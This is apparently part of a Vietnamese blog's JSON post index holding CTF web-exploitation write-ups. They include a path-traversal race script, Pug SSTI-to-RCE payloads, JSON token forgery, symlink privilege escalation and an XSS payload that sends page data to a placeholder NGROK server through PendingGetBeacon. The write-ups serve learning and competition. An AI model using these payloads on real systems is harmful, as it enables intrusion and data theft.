    "content": "Bài Ka Tuổi TrẻTóm tắt: Challenge này là sử dụng một server flask đơn giản với function đọc file tại endpoint / với params file sau đó thêm ./static vào đằng trước file để đọc file trong thư mục static. Phần sau là kiểm tra file có tồn tại không, dung lượng của file phải bé hơn 2MB và có quyền đọc nó thì sẽ tiếp tục đi qua regex nếu qua thì sẽ trả về nội dung của file đó.from flask import Flask, request, redirectfrom os import access, R_OK, statfrom os.path import isfile, join, normpathimport regeximport osapp = Flask(__name__, static_url_path='/static', static_folder='static')@app.get('/')def home():\tif request.args.get('file'):\t\tfilename = join(\"./static\", request.args.get('file'))\t\tif isfile(normpath(filename)) and access(normpath(filename), R_OK) and (stat(normpath(filename)).st_size &lt; 1024 * 1024 * 2):\t\t\ttry:\t\t\t\twith open(normpath(filename), \"rb\") as file:\t\t\t\t\tif not regex.search(r'^(([ -~])+.)+([(^~\\'!*&lt;&gt;:;,?\"*|%)]+)|([^\\x00-\\x7F]+)(([ -~])+.)+$', filename, timeout=2) and \"flag\" not in filename:\t\t\t\t\t\treturn file.read(1024 * 1024 * 2)\t\t\texcept:\t\t\t\tpass\treturn redirect(\"/?file=index.html\")Bài này nhìn vào là có thể nhận ra ngay dính lỗi path traversal khi chỉ dùng normpath để check path của file. Chúng ta có thể đơn giản là thêm /// vào là path của file sẽ được trỏ về root (ví dụ ///etc/passwd)Sau khi biết đây là lỗi path traversal thì mình thử kiểm xem filter của regex có thể bypass được khôngĐọc xong filter thì thì mình thấy đơn giản regex đầu tiên không có nghĩa gì cả và chặn nếu tên file có chữ flag. Lúc này thì vừa may có gợi ý là File descriptor nên mình nghĩ ra một cách khácFile descriptorFile descriptor là một định danh độc nhất cho một tập tin cái mà hệ điều hành gán cho nó khi mà mở một file nào đó. Nó cho phép các chương trình tương tác với files, sockets, I/O. File descriptor thường là một số nguyên không âm và được dùng để theo dõi các file và thực hiện thao tác trên nó.Vậy với cái này thì chúng ta sẽ làm gì ? Nhìn vào đoạn code trên khi mở một file trong text mode (‘w’, ‘r’, ‘wt’, ‘rt’, etc.) thì nó sẽ return một subclass của io.TextIOBase. Vậy có nghĩa là sao, có nghĩa là nó sẽ mở một file descriptor khi đọc một file. Ta có thể tận dụng cái này để đọc file thông qua việc không cần đọc qua đường đẫn của nó.Một ví dụ/proc/pid/fd/Đây là thư mục con chứa các symlink trỏ đến một file nào đó. Trong này luôn có các file 0, 1, 2 tương ứng với 0 là standard input, 1 là standard output, 2 là standard error và các file khác có thể là trỏ đến 1 socket nào đó hoặc 1 file cụ thểKết hợp hai điều trên ta có thể suy ra được cách giải như sauKhi mà mở 1 file trong text mode thì nó sẽ mở một file descriptor trong proc/pid/fd (pid là mã số của process đó) và file đó lại symlink đến file ta muốn đọc =&gt; đọc file bất kìVí dụVậy để giải bài này thì mình sẽ dùng file descriptor để đọc flagNhưng mà có một vấn đề là khi mở file thì nó lại đóng file quá nhanh làm mình chưa kịp access vào process id của nó nên bây giờ mình mới để ý phần regex filter của nó.Nếu tên file quá dài thì khi đưa qua regex nó sẽ chạy rất lâu(max là 2 giây) và mình có thể tận dụng khoảng thời gian này để vào proc/pid/fd và đọc fileSau một lúc fuzz thì mình thấy pid của nó nhảy ngẫu nhiên trong các giá trị 1,7,8,9 và file descriptor có tên là 10 sẽ là file symlink đến file mình đọcVậy ta có thể request đến server với payload /?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt để mở một file descriptor link đến file /flag.txt và do tên quá dài nên regex sẽ bị phải chạy lâuTrong thời gian 2s, mình gửi đến tất cả pid 1,7,8,9 và đọc file descriptor 10 để đọc flagDưới đây là script để tự động lấy flagimport requestsimport threadingimport timeurl = \"http://103.163.24.78:8888/?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt\"def get(id):    r = requests.get(url = f\"http://103.163.24.78:8888/?file=///proc/{id}/fd/10\")    if \"KCSC\" in r.text:        print(r.text)        exit()def start1():    r = requests.get(url = url)if __name__ == \"__main__\":    threading.Thread(target=start1).start()    time.sleep(1)    threading.Thread(target=get, args=(1,)).start()    threading.Thread(target=get, args=(7,)).start()    threading.Thread(target=get, args=(8,)).start()    threading.Thread(target=get, args=(9,)).start()Và ra flag"
  },
  
  {
    "title": "W1 Playground Writeup",
    "url": "/posts/W1Playground/",
    "categories": "CTF Writeup",
    "tags": "Prototype Pollution, SSTI, API testing, XSS, PHP",
    "date": "2024-04-30 23:00:00 +0700",
    





    
    "snippet": "Bài 1: easy loginPhân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin”Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhậpChức ...",
    "content": "Bài 1: easy loginPhân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin”Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhậpChức năng admin kiểm tra xem chúng ta có phải admin không qua isAdmin=true sau khi phân tích jwtkeySau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm logindata[\"__proto__\"][isAdmin]=true vào thì prototype của logindata sẽ có thuộc tính isAdmin=true từ đó logindata sẽ kế thừa thuộc tính đóPayloadCó jwtkey rồi thì vào admin để lấy flag thôiFlag : W1{REDACTED}Bài 2: render4freePhân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vàoSau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTISau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code jsBây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta- global.replace_bad_char = str_to_replace =&gt; str_to_replaceTiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval- global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace)Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nàoPayload require('child_process').exec('ping hacked.sv')Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng importNhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về nullOat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs  process.binding('spawn_sync').spawn({     file: 'ls',    args: [''],    stdio: [        { type: 'pipe', readable: true, writable: false },        { type: 'pipe', readable: false, writable: true },        { type: 'pipe', readable: false, writable: true }  ]}).output.toString()Ngon vậy là có thể thực hiện lệnh lsĐể ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flagPayload:  process.binding('spawn_sync').spawn({     file: '/read_flag',    args: [''],    stdio: [        { type: 'pipe', readable: true, writable: false },        { type: 'pipe', readable: false, writable: true },        { type: 'pipe', readable: false, writable: true }  ]}).output.toString()Flag: W1{REDACTED}Bài 3: Super sanitizerTóm tắt bài web này sử dụng WASM được compile từ C và sử dụng nó để xử lý input của user  File C nhận input của user và blacklist để xử lý nếu có ký tự blacklist thì ký tự đó sẽ bị xoá khỏi input của userBlacklist của bài này như sau &lt;imgoner='\\\"'&gt;Lỗi của bài này nằm ở đâyKhi chúng ta cho 1 ký tự có độ dài là 0x300 thì raw_str[0x300] sẽ bị tràn và sẽ ghi đè lên ký tự đầu tiên của blacklist là \\x00 từ đó blacklist sẽ trở thành rỗng -&gt; bypass filterNhưng đến đây thì vẫn chưa xong, web có CSP để làm XSS khó hơnSau một lúc fuzzing để kiểm tra thì dù CSP chặn redirect nhưng window.location.href=hackerwebsite.com vẫn resolve dns vậy ta có thể tận dụng cái này để leak flag do flag khá dài nên mình leak 2 lần để lấy flag (ví dụ flag.hackerwebsite.com)Nhưng leak kiểu gì? Mình đã thử leak kiểu btoa(document.cookie)+\".hackerwebsite.com\" nhưng khi leak thì vì lý do bảo mật dns query sẽ ngẫu nhiên uppercase hoặc lowercase các ký tự làm base64 bị lỗi nên nghĩ sang cách khác là document.cookie.charCodeAt(0-&gt;document.cookie.length-1) để leak ra từng ký tự của flag sang mã asciiPayload các bạn tự craft nhéFlag: W1{REACTED}"
  },
  
  {
    "title": "GreyCTF 2024",
    "url": "/posts/GreyCTF/",
    "categories": "CTF Writeup",
    "tags": "MYSQL, Base64",
    "date": "2024-04-21 23:00:00 +0700",
    





    
    "snippet": "No Sql InjectionI asked My friend Jason to build me a new e-commerce website. We just finished the login system and there's already bugs 🤦Author: jrohttp://challs.nusgreyhats.org:33336Phân tích qua...",
    "content": "No Sql InjectionI asked My friend Jason to build me a new e-commerce website. We just finished the login system and there's already bugs 🤦Author: jrohttp://challs.nusgreyhats.org:33336Phân tích qua thì bài này có các chức năng chính sau  /api/register/1app.post('/api/register/1', async (req, res) =&gt; {    try {        let { username } = req.body;        username = decode(username);        const token = btoa(JSON.stringify({            name: username,            admin: false        }));        console.log(token);        await query(\"insert into tokens values (?)\", [token]);        res.json({ \"err\": false, \"token\": token });    } catch (err) {        console.log(err);        res.json({ \"err\": true });    }})  /api/register/2app.post('/api/register/2', async (req, res) =&gt; {    try {        let { password, token } = req.body;        password = decode(password);        token = decode(token);        const result = await query(\"select 1 from tokens where token = ?\", [token]);        console.log(result);        if (result.length != 1) {            return res.json({ err: \"Token not found!\" });        }        await query(\"delete from tokens where token = ?\", [token]);        const { name, admin } = JSON.parse(atob(token));        console.log(JSON.parse(atob(token)))        await query(\"insert into users (name, password, admin) values (?, ?, ?)\", [name.toString(), password, admin === true]);        res.json({ \"err\": false });    } catch (err) {        console.log(err);        res.json({ \"err\": true });    }})  /api/loginapp.post('/api/login', async (req, res) =&gt; {    try {        let { password, username } = req.body;        password = decode(password);        username = decode(username);        const result = await query(\"select admin from users where name = ? and password = ?\", [username, password]);        if (result.length != 1) {            return res.json({ err: \"Username or password did not match\" });        }        if(result[0].admin) {            res.json({ \"err\": false, \"msg\": config.flag});        } else {            res.json({ \"err\": false, \"msg\": \"You've logged in successfully, but there's no flag here!\"});        }        // Prevent too many records from filling up the database        await query(\"delete from users where name = ? and password = ?\", [username, password]);    } catch (err) {        console.log(err);        res.json({ \"err\": true });    }})Giải thích các api endpoint  /register/1 sẽ nhận username khi chúng ta post data, sau đóbằng cách thêm vào một key:value - admin:false vào và chuyển sang dạng json và base64 encode nóSau đó backend sẽ thêm token này vào bảng tokens và gửi trả ta token như trên  /register/2 sẽ nhận password và token (cả 2 đều đã bị base64) khi chúng ta post data, sau đó decode cả 2 và kiểm tra xem token đã có trong db chưa, nếu có thì parse nó thành json và lấy dữ liệu của các trường name, password, adminSau đó backend sẽ xoá token này khỏi database và thêm các trường trên vào bảng users  /login thì đơn giản chỉ là check xem account có phải là admin không có thì in ra flag, không thì không in gì cảVậy trong này có cái gì tận dụng được để khai thác ? Thông thường so sánh của mysql là case-insensitive tức là ‘a’ == ‘A’ vậy bằng 1 cách nào đấy chúng ta có thể điều khiển cái token của chúng ta và khi parse nó thì nó sẽ ra data một cách khác thườngTừ đó token thông thường là{\"name\":\"yuu\",\"admin\":false}Sau khi bị chúng ta chỉnh sửa và nó bị biến đổi thành{\"name\":\"yuu\",\"admin\":true}Vì chúng ta chỉ có thể kiểm soát được giá trị của username nên chúng ta phải làm sao đó để phá dấu \" để ảnh hưởng đến các đặc tính của JSON ở đây đó chính là chỉnh sửa in hoa, in thường của các ký tự đại diện cho dâu \"Sau khi phá được dấu \" và viết được admin = true thì chúng ta vẫn còn 1 việc nữa phần admin = false ở phía sau vẫn còn và sẽ ghi đè giá trị admin ở trước, lúc này chúng ta có thể tiếp tục phá giá trị của admin = false ở sau bằng cách chỉnh lại ký tự in hoa -&gt; thường của ký tự đại diện cho giá trị adminVà có 1 điều cần lưu ý là JSON.stringify khi parse các JSON object nếu các ký tự đó không thể decode qua UTF-8 hay UTF-16 thì nó sẽ trả về unicode code và escape nó ví dụ (JSON.stringify('\\uDF06') -&gt; '\"\\\\udf06\"' )Vậy chúng ta vừa corrupt cái base64 token và kiểm tra xem các ký tự đó có thể decode qua UTF-8 hay UTF-16 khôngDưới đây là một cách mình tìm đượcsafe : b'{\"name\":\"yuu (\\xac\\x8aadmin\\x8a:true-\\xc2c\\x8a3\\xa2to\",\"admin\":false}',malicious: b'{\"name\":\"yuu \",\"admin\":true,\"c\":\"to\",\"admOn\":false}'2 base64 của payload trênsafe: eyJuYW1lIjoieXV1ICisimFkbWluijp0cnVlLcJjijOidG8iLCJhZG1PbiI6ZmFsc2V9,malicious: eyJuYW1lIjoieXV1ICIsImFkbWluIjp0cnVlLCJjIjoidG8iLCJhZG1PbiI6ZmFsc2V9Login bằng username ở trên (trong trường hợp payload của mình là yuu ) và password ta có flag"
  },
  
  {
    "title": "PicoCTF 2024",
    "url": "/posts/PicoCTF2024/",
    "categories": "CTF Writeup",
    "tags": "NoSQL, Bypass Filter, PHP Webshell, Symlink",
    "date": "2024-03-27 23:00:00 +0700",
    





    
    "snippet": "PicoCTF2024 đã kết thúc, giải này mình có khá nhiều nuối tiếc vì bài cuối web quá khó, dù không clear nhưng team Zafk1el tụi mình đã cố gắng hết sức. Tiện đây mình viết writeup một số bài đáng chú ...",
    "content": "PicoCTF2024 đã kết thúc, giải này mình có khá nhiều nuối tiếc vì bài cuối web quá khó, dù không clear nhưng team Zafk1el tụi mình đã cố gắng hết sức. Tiện đây mình viết writeup một số bài đáng chú ý trong giải này.GENERAL SKILLS: dont-you-love-bannersCan you abuse the banner?The server has been leaking some crucial information on tethys.picoctf.net 64560. Use the leaked information to get to the server.To connect to the running application use nc tethys.picoctf.net 64699. From the above information abuse the machine and find the flag in the /root directory.CÁCH 1: symlinkTrước hết thì trả lời vài câu hỏi để được vào được shell của playerKhi mình vào được shell thì bắt đầu lượn qua các folder, mô tả của bài bảo hãy tìm cách đọc flag ở folder /root nên mình cd đến folder đó để xemTất nhiên là làm gì có chuyện dễ thế, flag đã bị giới hạn quyền chỉ có root mới có quyền đọcVậy làm gì bây giờ ? Lúc này mình mới để ý có file script.py nên mình mở lên xem, đây là nội dung file script.pyimport osimport ptyincorrect_ans_reply = \"Lol, good try, try again and good luck\\n\"if __name__ == \"__main__\":    try:      with open(\"/home/player/banner\", \"r\") as f:        print(f.read())    except:      print(\"*********************************************\")      print(\"***************DEFAULT BANNER****************\")      print(\"*Please supply banner in /home/player/banner*\")      print(\"*********************************************\")try:    request = input(\"what is the password? \\n\").upper()    while request:        if request == 'MY_PASSW@RD_@1234':            text = input(\"What is the top cyber security conference in the world?\\n\").upper()            if text == 'DEFCON' or text == 'DEF CON':                output = input(                    \"the first hacker ever was known for phreaking(making free phone calls), who was it?\\n\").upper()                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':                    scmd = 'su - player'                    pty.spawn(scmd.split(' '))                else:                    print(incorrect_ans_reply)            else:                print(incorrect_ans_reply)        else:            print(incorrect_ans_reply)            breakexcept:    KeyboardInterruptTrong file này thì không có gì đáng chú ý trừ 2 điểm  File này chạy dưới quyền root  File này đọc nội dung 1 tệp tin là /home/player/bannerLúc này thì ta rút ra dùng symlink để /home/player/banner trỏ đển /root/flag.txt và đọc được flagBây giờ chỉ cần nc lại server thì script.py sẽ tự động đọc flag in ra cho taCÁCH 2: crack passworkTrong bài này chúng ta ngoài quyền đọc 1 số file mặc định thì chúng ta lại được cấp quyền đọc file /etc/shadow, file này là file quan trọng chứa password của tất cả user ( đã bị mã hoá ) vậy nếu chúng ta có thể decrypt lại thì chúng ta sẽ có password và thăng lên quyền rootVề cách crack password thì mình sử dụng tool hashcat để crack ra passwordCách này thì mình không đánh giá cao lắm vì nhìn hơi cùi &lt;(“) nhưng mà nó cũng là một cáchFunfact: Trong lúc làm bài này mình đã ngẫu nhiên gõ đúng password của root trong ngay lần đầu tiên, sau đó mình mới dùng cách symlinkFlag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}GENERAL SKILLS: SansAlphaThe Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.Additional details will be available after launching your challenge instance.Bài này chặn tất cả các chữ cái và 1 số ký tự đặc biệt, chỉ có thể xài số và các ký tự đặc biệt. Bài này sau một lúc suy nghĩ thì mình nghĩ theo hướng wildcards và tìm ra 2 cách khá hayCách 1: Sử dụng base32Sau một lúc fuzzing thì mình tìm thấy file flag.txt ở ./blargh/flag.txtTiếp theo chúng ta cần tìm cách đọc flag. Để thực thi được lệnh thì trong lệnh đó chỉ có thể có ký tự đặc biệt và số, kết hợp wildcard chúng ta chỉ cần tìm những lệnh có số là được. Sau đó, mình tìm được 2 lệnh có thể dùng được đó là base64 và base32Nhưng có một vấn đề đó là base64 khi dùng wildcard lại trùng với một tệp thực thi khác /usr/bin/x86_64 vậy thì còn lại base32 có vẻ khả thiChúng ta có thể dùng wildcard gọi ra file base32 như sau /???/???/????32 và flag thì có địa chỉ ở trên rồi bây giờ kết hợp lại để đọc flag.txt.Decode base32 sex ra flagCách 2: Sử dụng stringsLúc nãy mình mới nói là chỉ có thể gọi ra file thực thi có số thôi mà lệnh strings thì làm gì có số để mà gọi =))) thật ra là có một cách nhưng cách này chỉ gọi được rất giới hạnBằng cách tận dụng tham số special bash ta có thể gọi ra một số ký tự, như ở challenge hiện tại chúng ta có dùng $- để gọi ra các ký tự sau 'h', 'i', 'm', 'B', 'H', 's'Giải thích ngắn gọn thì $- là tổng hợp các flag được thiết lập cho shell bash hiện tại, như shell ở trên thì ý nghĩa từng ký tự như sauH - histexpand: Đây là flag cho phép chúng ta lấy những gì chúng ta đã nhập bỏ vào input để tiếp tục thực hiện lệnh, cho phép chúng ta dễ dàng nhập và lặp lại lệnhm - monitor: Đây là flag liên quan đến job control, giúp chúng ta theo dõi các job trong shellh - hashall: Đây là flag được bật lên mặc định, nó giúp lưu trữ các lệnh mà ta thường xài để giúp tăng tốc tốc độ thực thi chương trìnhB - braceexpand: Đây là flag làm cho shell có thể sử dụng brace expansioni - interactive: Đây là flag khi mà shell có thể tương tác đượcCó thể đọc thêm tại đây LINKBây giờ dựa vào đó, chúng ta có thể gán giá trị đó vào một biến khác để dễ dàng sử dụng hơn mình sử dụng biến ____ để lấy giá trị $-Lúc này mình kiểm tra đã gán thành công bây giờ đến bước lấy ký tự trong đó ra bằng ${____:index:len}Sau khi đánh giá các lệnh có thể mình đã chọn lệnh strings để sử dụng, dựa vào các dữ kiện ở trên mình có thể craft được payload như sau /?${____:5:1}?/???/${____:5:1}??${____:1:1}??${____:5:1} (/?s?/???/s??i??s)Lúc này chúng ta gần như có được lệnh ls (fake) và cat (fake) với lệnh này ta có thể đọc bất kỳ file nào nếu biết địa chỉĐọc flagFlag: picoCTF{7h15_mu171v3r53_15_m4dn355_36a674c0}WEB EXPLOITATION: No Sql InjectionCan you try to get access to this website to get the flag?You can download the source here.The website is running here. Can you log in?App sử dụng MongoDB, sử dụng phương thức POST để gửi giá trị email và password lênBài này chỉ có 2 chổ cần chú ý  Tại /api/login/route.ts có 1 đoạn lệnh như sau       const users = await User.find({  email: email.startsWith(\"{\") &amp;&amp; email.endsWith(\"}\") ? JSON.parse(email) : email,  password: password.startsWith(\"{\") &amp;&amp; password.endsWith(\"}\") ? JSON.parse(password) : password});if (users.length &lt; 1)  return new Response(\"Invalid email or password\", { status: 401 },users);else {  return new Response(JSON.stringify(users), { status: 200 });}        Và tại /models/user.ts có đoạn lệnh      const UserSchema: Schema = new Schema({email: { type: String, required: true, unique: true },firstName: { type: String, required: true },lastName: { type: String, required: true },password: { type: String, required: true },token: { type: String, required: false ,default: \"\"},  });  const User = models.User || mongoose.model&lt;UserInterface&gt;(\"User\", UserSchema);      Tại route.ts đoạn code sẽ kiểm tra xem nếu biến email và password truyền vào bắt đầu bằng ‘{‘ và kết thúc bằng ‘}’ thì parse cái JSON đó ra còn ngược lại thì truyền vào nguyên giá trị đó và nếu login vào thành công sẽ trả về usersTại user.ts đoạn code trên gán một key là token với value mặc định là FLAGMongoDB thì có thể thêm một số query operator để tạo ra các điều kiện cụ thể để database trả về dữ liệu ứng với điều kiện đó, dựa vào đó ta có thể bắt nó trả về giá trị mà ta mong muốnVậy chúng ta có thể thêm một query operator $ne để trả về tất cả giá trị không giống với giá trị ta nhập vàoDecode token và có được flagFlag: picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_af67328d}WEB EXPLOITATION: TricksterI found a web app that can help process images: PNG images only!Additional details will be available after launching your challenge instance.Bài này cho một trang web để upload ảnh png lên, vì đây là một bài blackbox nên mình check /robots.txt xem có gì hot khôngCó 2 đường dẫn  /uploads/ có vẻ đây là nơi sẽ lưu trữ các file mình upload lên  /instructions.txt nội dung của nó tóm tắt là nó sẽ cho phép file upload lên có .png trong tên, có header của PNGUpload một vài bức ảnh thì nhận ra backend của web sử dụng PHP nên mình sẽ up file PHP để tạo một cái webshellCó được webshell rồi thì lấy flag thôiFlag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}WEB EXPLOITATION: elementsInsert Standard Web Challenge Here.Bài này cho một trang web có giao diện như sauTrang web này có chức năng kéo các element vào nhau để tạo ra element mới.Sau khi phân tích qua source code thì có các điều đáng chú ý sau:  const evaluate = (...items) =&gt; {    const [a, b] = items.sort();    for (const [ingredientA, ingredientB, result] of recipes) {      if (ingredientA === a &amp;&amp; ingredientB == b) {        if (result === 'XSS' &amp;&amp; state.xss) {          eval(state.xss);        }        return result;      }    }\t  return null;  }Đoạn code này nếu chúng ta tạo ra một element có tên là XSS và có giá trị state.xss  thì có thể thực hiện lệnh eval()try {\tstate = JSON.parse(atob(window.location.hash.slice(1)));\tfor (const [a, b] of state.recipe) {\t\tif (!found.has(a) || !found.has(b)) {\t\t\tbreak;\t\t}\t\tconst result = evaluate(a, b);\t\tfound.set(result, elements.get(result));\t}} catch(e) {}Đoạn code này sẽ lấy object state bằng cách decode phần sau dấu thăng (fragment identifier) và parse nó sau đó lấy từng giá trị trong state.recipe để craft lên element mớiconst csp =  [\t\t\"default-src 'none'\",\t\t\"style-src 'unsafe-inline'\",\t\t\"script-src 'unsafe-eval' 'self'\",\t\t\"frame-ancestors 'none'\",\t\t\"worker-src 'none'\",\t\t\"navigate-to 'none'\"]res.setHeader('Content-Security-Policy', csp.join('; '));res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');res.setHeader('X-Frame-Options', 'deny');res.setHeader('X-Content-Type-Options', 'nosniff');Đoạn này thì set lần lượt các csp (Content-Security-Policy) để bảo mật trang web giải thích sơ quaDefault-src: none : Các nguồn được mặt định là không cho phép từ bất kỳ nguồn nàoStyle-src : unsafe-inline : Cho phép chèn một inline block styleScript-src : unsafe-eval self : Cho phép dùng lệnh eval và dùng các script được tải từ cùng một nguồnframe-ancestors none : Không cho phép các trang web khác nhúng nó vào một frame hay iframe nào đóworker-src 'none' : Không cho phép sử dụng Worker để thực thi các lệnh javascript độc lập chạy song songnavigate-to 'none' : Không cho phép điều hướng trang webstate = {...state, flag }await mkdir(join(userDataDir, 'Default'));await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({\t\tnet: {\t\t\tnetwork_prediction_options: 2\t\t}}));const proc = spawn(\t\t'/usr/bin/chromium-browser-unstable', [\t\t`--user-data-dir=${userDataDir}`,\t\t'--profile-directory=Default',\t\t'--no-sandbox',\t\t'--js-flags=--noexpose_wasm,--jitless',\t\t'--disable-gpu',\t\t'--no-first-run',\t\t'--enable-experimental-web-platform-features',\t\t`http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}`\t],\t{ detached: true })Và cuối cùng là đoạn này, khi chúng ta đến đường dẫn /remoteCraft và cho nó 1 parameter recipe thì chúng ta có trigger server đi đến website này với phần fragment identifier là giá trị của object stateCó một vài setting đã được thêm vào, đoạn setting này sẽ ngăn không cho tải trước bất kỳ tài nguyên từ mạng nàonet:{  network_prediction_options: 2}Sau khi có các dữ kiện, chúng ta có thể nghỉ đến craft recipe sao cho trả về kết quả là XSS và chèn lệnh javascript vào để eval gửi flag về cho chúng ta, mình đã thử rất nhiều cách và tìm được một cách đó là sourceMappingURL nhưng để dùng được cái này thì phải mở được Devtools của chrome nhưng cách này hoàn toàn không được vì dính bảo mật của chromeSau đó mình thử rất nhiều lệnh vào nhưng không có lệnh nào có thể vượt qua được csp và các setting của chrome trên, đến lúc này thì mình đã bó tay và bỏ cuộcSau giải khi mình đọc được writeup của satoki thì mình mới biết được rằng chúng ta có thể dùng PendingGetBeacon đây là một chức năng thử nghiệm của chrome (sau này được thay thế bằng fetchLater ở những phiên bản sau này)Giải thích về chức năng của PendingGetBeacon nó sẽ gửi request đến một HTTPS server sau khi browser bị huỷ hoặc đã được lưu vào cache và không được tải lại sau một khoảng thời gian. Nhưng điều đặc biệt nhất, nó không bị dính giới hạn của CSP và có thể dùng để gửi data trong web ra ngoàiTa sẽ thêm một options để send beacon khi mà trang  bị huỷ/ không được load sau 1 thời gian nhất định sẽ gửi request lên server bằng {timeout:1000}(sau 1s sẽ gửi)Lúc này thì đã biết được lệnh nào có thể sử dụng được thì đoạn này đã dễ rồiPayload: recipe={\"recipe\": [[\"Air\", \"Water\"], [\"Earth\", \"Water\"], [\"Earth\", \"Fire\"], [\"Fire\", \"Mist\"], [\"Magma\", \"Mud\"], [\"Fog\", \"Mud\"], [\"Obsidian\", \"Water\"], [\"Hot Spring\", \"Sludge\"], [\"Fire\", \"Steam Engine\"], [\"Air\", \"Earth\"], [\"Earth\", \"Obsidian\"], [\"Hot Spring\", \"Steam Engine\"], [\"Dust\", \"Heat Engine\"], [\"Computer Chip\", \"Fire\"], [\"Computer Chip\", \"Steam Engine\"], [\"Computer Chip\", \"Electricity\"], [\"Magma\", \"Mist\"], [\"Fire\", \"Sand\"], [\"Artificial Intelligence\", \"Data\"], [\"Computer Chip\", \"Software\"], [\"Air\", \"Rock\"], [\"Glass\", \"Software\"], [\"Encryption\", \"Software\"], [\"Internet\", \"Program\"], [\"Cybersecurity\", \"Vulnerability\"], [\"Exploit\", \"Web Design\"]], \"xss\": \"new PendingGetBeacon('https://NGROKSERVER/xxxx/?yuu=' + window.location.hash.slice(1), {timeout: 1000});\"}Sau khoảng 1s sẽ nhận được một request đến server của taDecode và lấy flagFlag: picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}Fun fact: Bài này sau khi mình hết cứu thì mình đã thực hiện phương thức random bullshit go và bị người anh pro của mình nhắc nhở :\"(( may mà không có cái payload nào hack máy mình, hehe cảm ơn anh đã nhắc nhởLời bạt: Sau giải thì mình cũng học được thêm rất nhiều thứ và được cùng team chơi giải này, mong sau này team mình đạt được thứ hạng cao hơn. Cảm ơn ae (Hidori, Kuro0, fuyosuru, SinsAries)Nguồn Writeup: https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024"
  },
  
  {
    "title": "Wannagame Freshman CTF writeup",
    "url": "/posts/Wannagame-Freshman/",
    "categories": "CTF Writeup",
    "tags": "SQL Injectiom, SSTI",
    "date": "2023-11-11 23:00:00 +0700",
    





    
